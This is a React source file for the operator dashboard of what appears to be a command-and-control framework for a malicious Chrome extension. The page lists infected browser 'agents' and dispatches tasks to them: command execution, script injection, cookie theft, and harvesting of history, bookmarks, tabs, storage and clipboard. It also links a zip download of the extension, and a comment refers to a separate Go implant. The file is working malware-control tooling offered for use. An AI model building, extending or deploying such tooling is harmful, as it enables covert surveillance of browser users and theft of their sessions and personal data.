"use client";
import { PageContainer } from "@/components/ui/page-container";
import { useState, useEffect, useCallback } from "react";

import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { useI18n } from "@/lib/i18n";
import { Banner } from "@/components/ui/banner";
import { toast } from "sonner";
import { useVisibleInterval } from "@/lib/hooks/useVisibleInterval";
import { DataState } from "@/components/ui/data-state";
import { EmptyState, Spinner } from "@/components/UI";
import { timeAgo } from "@/lib/utils";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Download, Globe, Send } from "lucide-react";

interface ChromeAgent {
  uuid: string;
  hostname: string;
  platform: string;
  language: string;
  browser: string;
  last_seen: string;
  status: string;
}

export default function ChromeC2Page() {
  const { t } = useI18n();
  const [agents, setAgents] = useState<ChromeAgent[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  // Experimental: tasks target the Chrome extension agent only, not the standard Go implant.
  const [selectedAgent, setSelectedAgent] = useState("");
  const [taskType, setTaskType] = useState("chrome_exec");
  const [taskCommand, setTaskCommand] = useState("");
  const [taskPath, setTaskPath] = useState("");
  const [taskData, setTaskData] = useState("");
  const taskDetails = "";
  const [sending, setSending] = useState(false);
  const [msg, setMsg] = useState("");

  const TASK_TYPES = [
    { value: "chrome_exec", label: t("chrome.task_exec") },
    { value: "chrome_script", label: t("chrome.task_inject") },
    { value: "chrome_cookies", label: t("chrome.task_cookies") },
    { value: "chrome_bookmarks", label: t("chrome.task_bookmarks") },
    { value: "chrome_history", label: t("chrome.task_history") },
    { value: "chrome_tabs", label: t("chrome.task_tabs") },
    { value: "chrome_download", label: t("chrome.task_download") },
    { value: "chrome_storage", label: t("chrome.task_storage") },
    { value: "chrome_clipboard", label: t("chrome.task_clipboard") },
    { value: "chrome_idle", label: t("chrome.task_idle") },
  ];

  const fetchAgents = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const data = await api.get<{ agents: ChromeAgent[] }>(paths.chrome.agents);
      setAgents(data.agents || []);
    } catch {
      setAgents([]);
      setError(t("chrome.toast.load_failed"));
      toast.error(t("chrome.toast.load_failed"));
    } finally {
      setLoading(false);
    }
  }, [t]);

  useEffect(() => { fetchAgents(); }, [fetchAgents]);
  useVisibleInterval(fetchAgents, 15000);

  async function sendTask() {
    if (!selectedAgent) { setMsg(t("chrome.select_agent")); return; }
    setSending(true);
    setMsg("");
    try {
      const res = await api.postJson(paths.chrome.agentTasks(selectedAgent), {
        type: taskType,
        command: taskCommand,
        path: taskPath,
        data: taskData,
        details: taskDetails,
      });
      setMsg(t("chrome.toast.sent") + " (ID: " + (res as Record<string, unknown>).task_id + ")");
    } catch (e) {
      setMsg(t("chrome.toast.send_failed") + ": " + (e instanceof Error ? e.message : String(e)));
    } finally {
      setSending(false);
    }
  }

  const statusBadge = (status: string) => {
    const variant = status === "online" ? "success" : status === "stale" ? "warning" : "destructive";
    const dot = status === "online" ? "bg-emerald-500"
      : status === "stale" ? "bg-amber-500"
      : "bg-destructive";
    return (
      <Badge variant={variant} className="gap-1.5">
        <span className={`w-1.5 h-1.5 rounded-full ${dot}`}></span>
        {status}
      </Badge>
    );
  };

  return (
      <PageContainer title={<span><Globe className="w-4 h-4 text-primary mr-2 inline" />{t("chrome.title")}</span>} subtitle={`${agents.length} extension agent${agents.length !== 1 ? "s" : ""} ${t("chrome.connected")}`} actions={<>
        <a
          href="/forgec2-chrome-c2.zip"
        >
          <Button size="sm">
            <Download className="w-4 h-4" />{t("chrome.download_ext")}
          </Button>
        </a>
      </>}>
      <Card className="p-3 border-amber-500/40 bg-amber-500/10 text-sm text-amber-800 dark:text-amber-200">
        <div className="font-semibold">{t("chrome.experimental_title")}</div>
        <div className="text-xs text-muted-foreground mt-0.5">{t("chrome.experimental_desc")}</div>
      </Card>
      

      <DataState loading={loading} error={error} onRetry={fetchAgents}>
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
          {/* Agent List */}
          <div className="lg:col-span-2">
            <Card className="overflow-hidden p-0">
              <div className="px-5 py-3 border-b border-border">
                <h3 className="text-sm font-semibold text-foreground">{t("chrome.agents")}</h3>
              </div>
              {agents.length === 0 ? (
                <div className="py-16 sm:py-20 text-center text-muted-foreground/70 text-sm">
                  <EmptyState icon={Globe} title={t("chrome.empty")} message={t("chrome.empty_desc")} />
                </div>
              ) : (
                <div className="divide-y divide-border">
                  {agents.map((a) => (
                    <div
                      key={a.uuid}
                      onClick={() => setSelectedAgent(a.uuid)}
                      className={`px-5 py-3 flex items-center justify-between cursor-pointer hover:bg-muted transition-colors ${selectedAgent === a.uuid ? "bg-primary/10" : ""}`}
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        <Globe className="w-4 h-4 text-primary" />
                        <div>
                          <p className="text-sm font-medium text-foreground">{a.hostname || a.uuid.substring(0, 8)}</p>
                          <p className="text-xs text-muted-foreground/70">{a.uuid.substring(0, 8)}... &middot; {a.platform || "?"}</p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        {statusBadge(a.status)}
                        <span className="text-(--fs-micro-sm) text-muted-foreground/70">
                          {a.last_seen ? timeAgo(a.last_seen) : ""}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </Card>
          </div>

          {/* Task Dispatch */}
          <div>
            <Card className=" p-4 sm:p-5">
              <h3 className="text-sm font-semibold text-foreground mb-4">
                <Send className="w-4 h-4" />{t("chrome.dispatch")}
              </h3>

              <div className="space-y-3">
                <div>
                  <Label className="text-xs mb-1">{t("chrome.field_type")}</Label>
                  <Select value={taskType} onValueChange={(v) => setTaskType(v ?? "")}>
                    <SelectTrigger className="w-full">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      {TASK_TYPES.map((tt) => (
                        <SelectItem key={tt.value} value={tt.value}>{tt.label}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div>
                  <Label className="text-xs mb-1">{t("chrome.field_command")}</Label>
                  <Input aria-label={t("chrome.field_command")} name="input-1"
                    type="text"
                    value={taskCommand}
                    onChange={(e) => setTaskCommand(e.target.value)}
                    placeholder={t("chrome.cmd_ph")}
                  />
                </div>

                <div>
                  <Label className="text-xs mb-1">{t("chrome.field_path")}</Label>
                  <Input aria-label={t("chrome.field_path")} name="input-2"
                    type="text"
                    value={taskPath}
                    onChange={(e) => setTaskPath(e.target.value)}
                    placeholder={t("chrome.path_ph")}
                  />
                </div>

                <div>
                  <Label className="text-xs mb-1">{t("chrome.field_data")}</Label>
                  <Textarea aria-label={t("chrome.field_data")} name="textarea-3"
                    value={taskData}
                    onChange={(e) => setTaskData(e.target.value)}
                    placeholder={t("chrome.data_ph")}
                    rows={3}
                    className="resize-none"
                  />
                </div>

                <Button
                  onClick={sendTask}
                  disabled={sending || !selectedAgent}
                  size="sm"
                >
                  {sending ? <><Spinner size="xs" /> {t("chrome.sending")}</> : t("chrome.send")}
                </Button>

                {msg && (
                  <Banner tone={msg.startsWith(t("chrome.toast.send_failed")) || msg.startsWith(t("chrome.select_agent")) ? "destructive" : "success"} className="text-xs">
                    {msg}
                  </Banner>
                )}
              </div>
            </Card>
          </div>
        </div>
      </DataState>
    </PageContainer>
  );
}
